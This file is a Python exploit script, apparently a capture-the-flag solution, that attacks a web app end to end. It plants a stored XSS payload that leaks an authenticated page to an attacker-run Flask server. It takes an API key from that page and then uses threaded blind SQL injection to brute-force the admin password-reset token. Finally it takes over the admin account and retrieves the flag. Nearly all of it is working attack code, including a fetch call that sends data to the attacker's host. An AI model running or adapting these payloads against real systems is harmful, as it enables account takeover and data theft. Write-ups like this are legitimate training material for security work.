from flask import Flask, render_template_string,request
from requests import post,get
import threading, base64,json,urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

lock = threading.Lock()
TARGET = input("Your instance URL: ")
if "https" not in TARGET:
    TARGET.replace("http","https")
ATTACKER = input("your interface that will run this app: e.g http://142.90.81.1:9999: ").strip("/")
dev_data = ""
API_key = ""
reset_token = ""
CHARS = "abcdef0123456789"

app = Flask(__name__)

ONE = r'''
<!-- 1 -->
 <script>
    window.open("/2")
    window.location.href = "http://web:80/api/me.php"
 </script>
 '''

SEOND = rf'''
<!-- 2 -->

<form action="http://web:80/login.php" method="post">
    <input type="text" name="username" value="&lt;script&gt;fetch(&quot;{ATTACKER}/leak?data=&quot;&#x2b;btoa(window.opener.document.body.innerHTML));&lt;/script&gt;" autocomplete>
    <input type="password" name="password" value="145263Mm123." autocomplete>
</form>
<script>
    setTimeout(function(){{document.forms[0].submit()}},100);
</script>
'''


def signup():
    post(f"{TARGET}/register.php",data={'username':f'<script>fetch("{ATTACKER}/leak?data="+btoa(window.opener.document.body.innerHTML));</script>','password':'145263Mm123.','confirm_password':'145263Mm123.'})

def report():
    post(f"{TARGET}/report_issue.php",data={"url":f"{ATTACKER}/1"})

def decode_data():
    global dev_data
    global API_key
    dev_data = dev_data.strip().replace(" ", "+")
    dev_data += "=" * (-len(dev_data) % 4)
    dev_data = base64.b64decode(dev_data).decode("utf-8").strip("<pre>").strip("</pre><div class=\"json-formatter-container\"></div")
    API_key = json.loads(dev_data)['api_key']
    

@app.route('/1')
def serve_form():
    return render_template_string(ONE), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route('/2')
def serve_form_sec():
    return render_template_string(SEOND), 200, {'Content-Type': 'text/html; charset=utf-8'}

@app.route("/leak")
def leak():
    global dev_data
    dev_data = request.args.get("data")
    return dev_data

def check_char(i, j, stop_event):
    if stop_event.is_set():
        return None
    payload = f"20 or 1=(select 1 from App\\Entity\\User a where a.id=1 and substring(a.code,{i},1)='{j}')"
    try:
        r = get(f"{TARGET}/api/search_feedback.php?feedback_id={payload}",
                headers={"X-API-Key": API_key}).text
        
    except:
        return None
    if "test feedback" in r:
        stop_event.set()
        return j
    return None

def admin_takeover():
    global reset_token
    post(f"{TARGET}/forgot_password.php", data={"username":"admin"},cookies={"PHPSESSID":"a"})
    print("Brute forcing the admin reset password token")
    for i in range(1, 65):
        stop_event = threading.Event()
        found_char = None
        with ThreadPoolExecutor(max_workers=len(CHARS)) as executor:
            futures = {executor.submit(check_char, i, ch, stop_event): ch for ch in CHARS}
            try:
                for fut in as_completed(futures):
                    res = fut.result()
                    if res:
                        found_char = res
                        break
            finally:
                for fut in futures:
                    if not fut.done():
                        fut.cancel()

        if found_char:
            with lock:
                reset_token += found_char
        else:
            print(f"[-] no character found at position {i}. stopping enumeration.")
            break
    print("admin Reset password token: "+reset_token)
    print("Obtaining the flag ")
    post(f"{TARGET}/reset.php",data={"new_password":"145263Mm123.","code":reset_token},cookies={"PHPSESSID":"a"}).text

def get_flag():
    admin_PHPSESSID = post(f"{TARGET}/login.php",data={"username":"admin","password":"145263Mm123."},allow_redirects=False).cookies.get("PHPSESSID")
    print(get(f"{TARGET}/flag.php",cookies={"PHPSESSID":admin_PHPSESSID}).text)

if __name__ == '__main__':
    signup()
    server = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=9999, debug=False, use_reloader=False))
    server.start()
    report()
    while(True):
        if(dev_data):
            break
    decode_data()
    admin_takeover()
    get_flag()
